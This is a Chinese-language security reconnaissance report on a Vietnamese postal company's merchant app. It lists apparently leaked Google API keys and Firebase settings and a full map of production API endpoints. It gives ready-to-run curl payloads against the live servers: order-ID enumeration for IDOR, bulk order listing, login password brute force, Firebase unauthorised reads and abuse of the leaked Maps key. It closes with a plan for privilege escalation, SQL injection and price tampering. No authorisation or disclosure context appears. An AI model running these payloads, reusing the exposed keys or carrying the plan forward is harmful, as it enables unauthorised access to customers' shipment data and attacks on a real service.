# EMS Vietnam Portal APP 漏洞分析报告

## 基础信息
- **包名**: com.emsportal
- **版本**: 最新版
- **API Base**: http://ws.ems.com.vn
- **分析日期**: 2025-11-02

## 已提取敏感信息

### 1. Google API密钥
```
AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY (主KEY)
AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc (备用KEY)
```

### 2. Firebase配置
```
URL: https://ems-khl-app-notify.firebaseio.com
Client ID: 452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com
Project ID: 452955012352
```

### 3. 认证机制
**Header格式**:
\`\`\`
Authorization: Bearer {TOKEN}
Content-Type: application/json;charset=UTF-8
\`\`\`

**Token存储**:
- 位置: SharedPreferences
- Key: PREF_TOKEN_USER
- 获取: 登录后服务器返回

### 4. API端点清单

#### 认证相关
\`\`\`
POST http://ws.ems.com.vn/auth/login
POST http://ws.ems.com.vn/api/v1/forgot-password
GET  http://ws.ems.com.vn/api/v1/auth/logout
POST http://ws.ems.com.vn/rc/send-confirmation-code
\`\`\`

#### 订单管理 (⚠️ IDOR风险点)
\`\`\`
GET  http://ws.ems.com.vn/api/v1/orders/list
POST http://ws.ems.com.vn/api/v1/orders/create
POST http://ws.ems.com.vn/api/v1/orders/create-v2
GET  http://ws.ems.com.vn/api/v1/orders/tracking/{ORDER_ID}
POST http://ws.ems.com.vn/api/v1/orders/accept
POST http://ws.ems.com.vn/api/v1/orders/cancel
POST http://ws.ems.com.vn/api/v1/orders/manual-cancel-order
GET  http://ws.ems.com.vn/api/v1/orders/quotes
GET  http://ws.ems.com.vn/api/v1/orders/summary
GET  http://ws.ems.com.vn/api/v1/orders/count-group
GET  http://ws.ems.com.vn/api/v1/orders/cod-by-date
GET  http://ws.ems.com.vn/api/v1/orders/order-cod
POST http://ws.ems.com.vn/api/v1/orders/estimate-fee
POST http://ws.ems.com.vn/api/v1/orders/suggest-address
POST http://ws.ems.com.vn/api/v1/orders/suggest-item
POST http://ws.ems.com.vn/api/v1/orders/rc-create
POST http://ws.ems.com.vn/api/v1/orders/rc-edit
GET  http://ws.ems.com.vn/api/v1/orders/rc-list
\`\`\`

#### 国际订单 (⚠️ IDOR风险点)
\`\`\`
GET  http://ws.ems.com.vn/api/v1/order-intl/list
POST http://ws.ems.com.vn/api/v1/order-intl/create
GET  http://ws.ems.com.vn/api/v1/order-intl/tracking/{ORDER_ID}
POST http://ws.ems.com.vn/api/v1/order-intl/calculate
GET  http://ws.ems.com.vn/api/v1/order-intl/count-group
GET  http://ws.ems.com.vn/api/v1/order-intl/country/
GET  http://ws.ems.com.vn/api/v1/order-intl/service
GET  http://ws.ems.com.vn/api/v1/order-intl/item-type
POST http://ws.ems.com.vn/api/v1/order-intl/address-suggestion
POST http://ws.ems.com.vn/api/v1/order-intl/hscode-suggestion
\`\`\`

#### 库存管理
\`\`\`
POST http://ws.ems.com.vn/api/v1/inventory/create
GET  http://ws.ems.com.vn/api/v1/inventory/list
PUT  http://ws.ems.com.vn/api/v1/inventory/update
\`\`\`

#### Grab集成
\`\`\`
GET  http://ws.ems.com.vn/api/v1/grab/list
POST http://ws.ems.com.vn/api/v1/grab/quotations
POST http://ws.ems.com.vn/api/v1/grab/deliveries
GET  http://ws.ems.com.vn/api/v1/grab/service
GET  http://ws.ems.com.vn/api/v1/grab/status
POST http://ws.ems.com.vn/api/v1/grab/suggest-address
POST http://ws.ems.com.vn/api/v1/grab/cancel/
\`\`\`

#### 用户管理
\`\`\`
GET  http://ws.ems.com.vn/api/v1/merchants/get-list-notify
PUT  http://ws.ems.com.vn/api/v1/merchants/update
PUT  http://ws.ems.com.vn/api/v1/merchants/update-notify
PUT  http://ws.ems.com.vn/api/v1/merchants/update/password
PUT  http://ws.ems.com.vn/api/v1/merchants/update-token
\`\`\`

#### 工单系统
\`\`\`
GET  http://ws.ems.com.vn/api/v1/tickets/list
POST http://ws.ems.com.vn/api/v1/tickets/create
PUT  http://ws.ems.com.vn/api/v1/tickets/update
POST http://ws.ems.com.vn/api/v1/tickets/case
GET  http://ws.ems.com.vn/api/v1/tickets/count-group
\`\`\`

#### 其他
\`\`\`
GET  http://ws.ems.com.vn/api/v1/address/*
GET  http://ws.ems.com.vn/api/v1/config/service
GET  http://ws.ems.com.vn/api/v1/be/config/list-status
GET  http://ws.ems.com.vn/api/v1/metadata/vas
GET  http://ws.ems.com.vn/api/v1/notifications/list
PUT  http://ws.ems.com.vn/api/v1/notifications/update
GET  http://ws.ems.com.vn/api/v1/reports/dashboard
GET  http://ws.ems.com.vn/api/v1/be/list-address
POST http://ws.ems.com.vn/api/v1/be/orders/*
\`\`\`

## 潜在漏洞点

### 1. IDOR - 未授权订单访问
**风险等级**: 🔴 高危

**漏洞描述**: tracking API可能存在IDOR，通过遍历order_id可访问他人订单

**攻击向量**:
\`\`\`bash
# 遍历订单ID
for i in {1000..9999}; do
  curl -H "Authorization: Bearer {TOKEN}" \\
    "http://ws.ems.com.vn/api/v1/orders/tracking/EMS\$i"
done
\`\`\`

### 2. 认证绕过
**风险等级**: 🔴 高危

**潜在问题**:
- Token过期检测不严格
- 无设备指纹绑定
- 可能存在JWT伪造

### 3. 批量枚举
**风险等级**: 🟡 中危

**影响API**:
- /orders/list (无分页限制?)
- /order-intl/list
- /tickets/list

### 4. 信息泄露
**风险等级**: 🟡 中危

**已泄露**:
- Google API Key (可滥用配额)
- Firebase配置
- 完整API结构

## 待测试Payload

### Payload 1: IDOR订单追踪
\`\`\`bash
TOKEN="YOUR_TOKEN_HERE"

# 测试当前用户订单
curl -X GET "http://ws.ems.com.vn/api/v1/orders/tracking/EMS123456789VN" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json"

# 尝试访问其他订单
curl -X GET "http://ws.ems.com.vn/api/v1/orders/tracking/EMS000000001VN" \\
  -H "Authorization: Bearer $TOKEN"
\`\`\`

### Payload 2: 订单列表越权
\`\`\`bash
# 尝试获取所有订单
curl -X GET "http://ws.ems.com.vn/api/v1/orders/list?limit=9999&offset=0" \\
  -H "Authorization: Bearer $TOKEN"
\`\`\`

### Payload 3: 登录爆破
\`\`\`bash
# 测试弱密码
for pwd in admin Admin@123 password 123456; do
  curl -X POST "http://ws.ems.com.vn/auth/login" \\
    -H "Content-Type: application/json" \\
    -d "{\"username\":\"test@ems.com\",\"password\":\"$pwd\",\"device_ime\":\"test\",\"device_type\":\"android\"}"
done
\`\`\`

### Payload 4: Firebase未授权访问
\`\`\`bash
# 测试Firebase读权限
curl "https://ems-khl-app-notify.firebaseio.com/.json"
curl "https://ems-khl-app-notify.firebaseio.com/orders/.json"
curl "https://ems-khl-app-notify.firebaseio.com/users/.json"
\`\`\`

### Payload 5: Google Maps API滥用
\`\`\`bash
# 使用泄露的API Key
curl "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=10.762622,106.660172&radius=5000&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
\`\`\`

## 下一步行动

1. **获取有效Token**
   - 注册测试账号
   - 抓包获取Bearer Token
   
2. **IDOR验证**
   - 测试订单追踪
   - 测试订单修改/取消
   
3. **权限提升测试**
   - 尝试修改角色参数
   - 测试管理员API

4. **SQL注入探测**
   - 订单搜索功能
   - 地址查询参数

5. **业务逻辑漏洞**
   - 价格篡改
   - 运费绕过
   - 促销码滥用

